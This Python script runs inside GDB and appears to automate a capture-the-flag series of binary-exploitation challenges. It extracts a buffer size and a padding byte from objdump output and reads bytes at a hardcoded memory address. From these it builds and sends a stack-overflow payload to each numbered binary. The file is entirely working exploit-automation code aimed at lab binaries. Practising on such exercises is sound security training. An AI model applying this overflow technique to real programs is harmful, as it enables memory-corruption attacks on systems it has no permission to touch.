import os
import gdb
f=open('count','r')
i1=f.read()
i=int(i1.replace('\n',''))
f.close()
if os.popen('objdump -M intel -d '+str(i)+'.bin|grep 65e').read()!="":
    print(i)
    a=os.popen('objdump -M intel -d '+str(i)+'.bin|grep 65e').read().split(',')[1].replace('\n','')
    b=os.popen('objdump -M intel -d '+str(i)+'.bin|grep 665').read().split(',')[1].replace('\n','')
    gdb.execute('file '+str(i)+'.bin')
    gdb.execute('r < \'t1\'')
    a1=gdb.execute('x/4bx 0x56557008',to_string=True).split(':')[1].replace('\t','').replace('\n','').replace(' ','').replace('0x','\\x')
    j=int(a,16)
    k=chr(int(b,16))
    g=k*j
    os.system('python -c print"\''+g+'\'+\''+a1+'\'" > inp')
    os.system('./'+str(i)+'.bin < inp')
    gdb.execute('quit')
else:
    print(i)
    a=os.popen('objdump -M intel -d '+str(i)+'.bin|grep 816').read().split(',')[1].replace('\n','')
    b=os.popen('objdump -M intel -d '+str(i)+'.bin|grep 81d').read().split(',')[1].replace('\n','')
    gdb.execute('file '+str(i)+'.bin')
    gdb.execute('r < \'t1\'')
    a1=gdb.execute('x/8bx 0x555555755010',to_string=True).split(':')[1].replace('\t','').replace('\n','').replace(' ','').replace('0x','\\x')
    j=int(a,16)
    k=chr(int(b,16))
    g=k*j
    os.system('python -c print"\''+g+'\'+\''+a1+'\'" > inp')
    os.system('./'+str(i)+'.bin < inp')
    gdb.execute('quit')
